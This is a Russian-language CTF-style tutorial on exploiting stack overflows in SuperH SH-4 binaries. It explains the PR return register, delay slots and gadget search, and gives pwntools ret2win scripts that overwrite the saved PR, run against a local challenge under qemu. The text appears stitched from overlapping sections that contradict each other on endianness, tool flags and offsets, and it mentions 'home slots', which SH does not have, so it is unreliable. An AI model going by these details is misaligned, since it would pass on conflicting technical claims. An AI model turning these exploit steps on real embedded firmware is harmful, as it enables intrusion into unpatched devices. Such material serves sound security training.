## Вопрос, с которого всё начинается

SuperH (SH) — 32-битная RISC-архитектура, которую Hitachi и Renesas ставили в
промышленную электронику, автомобильные блоки и игровые приставки. В прошивке
устройства ты можешь встретить ELF под SH-4 и не сразу понять, как к нему
подступиться. Разберём модель вызовов SH-4.

## Наш пример

```
$ file sh4.elf
sh4.elf: ELF 32-bit MSB relocatable, Renesas SH
$ readelf --file-header sh4.elf
  Class:                             ELF32
  Data:                              2's complement, big endian
  Machine:                           Renesas / SuperH SH
```

32 бита, big-endian (на большинстве SH-целей). Это уже определяет, как упаковывать
адреса.

## Шаг 1: регистры и PR

У SH-4 шестнадцать 32-битных регистров общего назначения `r0`..`r15`:

- `r0` — часто используется как временный и как индекс;
- `r4`..`r7` — первые аргументы функций;
- `r15` — указатель стека (SP);
- `r14` — frame pointer (FP) в соглашении GNU.

Главная особенность: адрес возврата хранится в регистре **`PR`** (Procedure
Register). Инструкция `jsr @Rn` (Jump to Subroutine) кладёт адрес возврата в
`PR` перед переходом. Возврат делает инструкция **`rts`** (ReTurn from
Subroutine) — она прыгает по `PR`.

## Шаг 2: пролог и сохранение PR

Чтобы вызвать другую функцию, текущая должна сохранить `PR` — иначе вложенный
вызов его перезапишет:

```
func:
	mov.l r14, @-r15      # сохранить r14
	sts.l pr, @-r15       # сохранить PR на стек
	mov r15, r14          # r14 = r15 (frame pointer)
	...
	lds.l @r15+, pr       # восстановить PR
	rts
	mov.l @r15+, r14      # delay slot
```

Здесь `sts.l pr, @-r15` сохраняет `PR` на стек (с преддекрементом `r15`), а
`lds.l @r15+, pr` восстанавливает его. **Именно сохранённый PR — цель
переполнения.** Перезаписав его, ты управляешь адресом возврата `rts`.

## Шаг 3: delay slot

Как и у SPARC, у SH-4 есть **delay slot**: инструкция сразу после `jsr`/`rts`/
`bra` исполняется **до** фактического перехода. В прологе выше видно, что после
`rts` стоит `mov.l @r15+, r14` — это и есть delay slot, он выполнится перед
возвратом. При построении цепочек и шеллкода в delay slot ставят `nop` или
полезную инструкцию, но никогда не оставляют «мусор».

## Шаг 4: инструкции фиксированной длины 16 бит

Все инструкции SH — ровно 16 бит (2 байта). Это, наоборот, **упрощает** поиск
гаджетов по сравнению с s390x: границы выровнены. `ROPgadget --rawArch=sh`
или `objdump -d` из `sh4-linux-gnu-binutils` находят последовательности,
заканчивающиеся `rts` или `jmp @Rn`.

## Шаг 5: собираем эксплойт

```python
from pwn import *
context.arch = 'sh4'
context.endian = 'big'
p = process('./challenge')
offset = 40            # до сохранённого PR
payload  = b'A' * offset
payload += p32(ret2win_addr)   # перезаписанный PR
p.sendline(payload)
p.interactive()
```

Порядок байт — big-endian, адреса 4-байтовые. Не забудь, что после `rts`
выполнится delay slot — если там окажется «мусорная» инструкция, лучше
подставить корректный адрес.

## Шаг 6: embedded-контекст

SH-4 жила в приставке Sega Dreamcast и в массе промышленных плат. Прошивки таких
устройств часто не имеют ASLR и NX — стек исполняемый, что открывает прямой путь
к шеллкоду. С другой стороны, объёмы памяти малы, а UART/JTAG для отладки может
отсутствовать, поэтому эксплуатация строится «слепой» — по утечкам и побочным
каналам.

## Шаг 7: почему это важно

Понимание SH-4 — это ещё один пример того, что модель вызовов может быть какой
угодно (LR, PR, окна), а приёмы переполнения остаются теми же. Навык читать ABI
незнакомой архитектуры напрямую переносится на новые embedded-цели.

## Что мы теперь знаем

- Возврат SH-4 — через регистр `PR` (`rts`).
- `jsr` кладёт адрес возврата в `PR`; вложенные вызовы сохраняют его на стек.
- Delay slot после ветвлений исполняется до перехода.
- Инструкции ровно 16 бит — гаджеты искать проще.
- Порядок байт обычно big-endian.

## Пролог и сохранение PR подробнее

В SuperH (SH-4) адрес возврата лежит в регистре **PR** (procedure register).
Типичный не-leaf пролог:

```
vuln:
    mov.l   r14, @-r15     ; сохраняем callee-saved
    mov.l   r12, @-r15
    sts.l   pr, @-r15      ; сохраняем PR на стек
    ...
    lds.l   @r15+, pr      ; восстанавливаем PR
    mov.l   @r15+, r12
    mov.l   @r15+, r14
    rts                    ; return from subroutine
    nop                    ; DELAY SLOT
```

`sts.l pr, @-r15` сохраняет PR на стек (декремент r15, затем запись). Обратный
`lds.l @r15+, pr` читает и инкрементирует. Значит, чтобы захватить управление,
нужно перезаписать именно слот PR. `rts` («return from subroutine») — переход по
PR, а следующая инструкция (`nop`) — delay slot. SH-4 выполняет её до перехода.

## Паттерн и смещение

```
$ python3 -c "from pwn import *; context.arch='sh4'; print(cyclic(128))"
$ qemu-sh4 -g 1234 ./challenge &
$ gdb-multiarch ./challenge -ex 'target remote :1234' -ex c
Program received signal SIGSEGV
(gdb) info registers pr
pr   0x61616161
(gdb) p cyclic_find(0x61616161)
```

SH-4 — little-endian, инструкции фиксированной длины 2 байта. Это заметно
упрощает поиск гаджетов по сравнению с Xtensa: границы выровнены на 2 байта, а
`ROPgadget --arch sh4` (или ручной `objdump -d -m sh4`) находит последовательности
достаточно надёжно. Помни: `nop` в delay slot — не пустая трата, а требование
архитектуры; если поставить туда полезную инструкцию, она выполнится до возврата.

## Delay slot в цепочке

Как и на MIPS/SPARC, delay slot усложняет ROP: каждая ветвь тащит за собой одну
инструкцию. Полезный гаджет обычно:

```
mov r0, r4
jmp @r1
mov r5, r6       ; выполнится до перехода
```

Найти готовые «jmp @rN; полезная_инструкция» можно в libc или в самом бинаре.
Часто проще прыгнуть на существующую функцию, чем строить цепочку: SH-4-код
компактен, и многие обёртки уже принимают нужные значения в регистрах.

## Отладка SH-4 без железа

Эмуляция: `qemu-sh4 -L /usr/sh4-linux-gnu ./challenge`. Для отладки —
`qemu-sh4 -g <port>` плюс `gdb-multiarch`. Проверка архитектуры:

```
$ readelf -h ./challenge | grep -E 'Machine|Class|Data'
  Class:   ELF32
  Data:    2's complement, little endian
  Machine: Renesas SH
```

Если `Class: ELF32` и `Machine: Renesas SH` — это 32-битный SH. Адреса 4 байта,
упаковка через `p32` в pwntools с `context.arch='sh4'`.

## Где встречается SuperH

SH-4 исторически стоял в Dreamcast и промышленных контроллерах; SH-2/SH-4 живут
в автомобильных ECU, принтерах, бытовой технике. Для пентеста это в первую
очередь прошивки и embedded-устройства: там часто нет NX, есть фиксированная
загрузка и минимум защит. Поэтому навык чтения SH-ассемблера полезен при разборе
прошивок, а delay slot и PR — обязательные детали для построения рабочего
эксплойта.

## Сборка минимального эксплойта SH-4

Полный прогон: находим смещение, подставляем адрес функции-победителя.

```python
from pwn import *
context.arch = 'sh4'
context.endian = 'little'

p = process(['qemu-sh4', '-L', '/usr/sh4-linux-gnu', './challenge'])
offset = 44                      # измерено через cyclic
payload  = b'A' * offset
payload += p32(0x00400a2c)       # адрес win-функции (пример)
p.sendline(payload)
p.interactive()
```

Здесь `p32` кладёт 4-байтовый адрес little-endian. Если нужна передача
аргумента, ищем гаджет `mov r4, rN` или используем существующую обёртку. Важно:
адрес должен быть выровнен на 2 байта (длина инструкции SH), иначе процессор
уйдёт в исключение.

## Проверка через strace и логи

Если эксплойт «молчит», смотрим, что делает процесс:

```
$ qemu-sh4 -strace -L /usr/sh4-linux-gnu ./challenge < payload.bin
```

`-strace` печатает системные вызовы qemu — по ним видно, дошли ли мы до
`execve`, или упали раньше. В связке с `dmesg` (на реальном железе) это даёт
понимание, где именно рвётся цепочка: неверное смещение, неверный endianness или
неисполняемая страница.

## Итог по SuperH

SuperH учит двум вещам, важным для любой embedded-эксплуатации: адрес возврата
может жить в специальном регистре (`PR`), а delay slot обязателен. Эти идеи
повторяются на MIPS, SPARC и Xtensa. Освоив SH-4, ты легко читаешь прошивки
принтеров, автомобильных ECU и другой техники, где десятилетиями живёт
необновляемый код.

## Частые вопросы

**Почему payload не срабатывает, хотя адрес верный?** Скорее всего, сбито
выравнивание стека или неверен порядок байт. Проверь `readelf -h` и добавь
padding до кратности 4/8.

**Что делать, если функция leaf?** Искать другой примитив: сохранённые
callee-saved регистры, указатели на функции в структурах или глобальные
таблицы. Контроль над `pc` через переполнение стека тут недостижим.

**Как быстро найти смещение?** Всегда через `cyclic`/`cyclic_find`, никогда
вручную — ручной подсчёт ошибается на padding и home slots.
